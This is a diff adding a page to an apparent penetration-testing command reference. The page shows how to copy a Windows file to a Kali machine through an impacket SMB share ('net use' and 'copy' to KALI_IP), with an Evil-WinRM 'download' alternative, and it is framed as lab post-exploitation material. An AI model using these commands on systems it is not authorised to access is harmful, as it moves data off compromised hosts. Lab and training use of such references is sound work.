@@ -1,0 +1,52 @@
+---
+title: "Windows → Kali file transfer"
+sidebarTitle: "Windows → Kali file transfer"
+description: "Copy a Windows file to Kali over an authenticated SMB share. Requires Windows → Kali TCP 445."
+keywords: ["windows to linux", "windows to kali", "upload file", "file transfers", "file transfer", "transfer files", "copy windows file", "smb upload"]
+boost: 10
+hideFooterPagination: true
+---
+
+{/* Generated from Commands/windows-to-linux.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+Replace UPPER_CASE values with your lab values.
+
+## 1. Kali — receive folder and SMB server
+
+**Kali**
+
+```bash
+mkdir -p ~/transfer
+sudo impacket-smbserver share ~/transfer -smb2support -user transfer -password 'TRANSFER_PASSWORD'
+```
+
+Keep this terminal running. Replace TRANSFER_PASSWORD in both commands.
+
+## 2. Windows — connect and copy
+
+**Windows cmd.exe**
+
+```bash
+net use \\KALI_IP\share /user:transfer TRANSFER_PASSWORD
+copy C:\path\file.zip \\KALI_IP\share\file.zip
+```
+
+The file appears in ~/transfer on Kali.
+
+## Alternative — if already in Evil-WinRM
+
+**Evil-WinRM prompt**
+
+```bash
+download C:\path\file.zip ./file.zip
+```
+
+Saves the file on the Kali machine running Evil-WinRM.
+
+[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=windows%20to%20linux)
+
+## Learning and original examples
+
+- [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
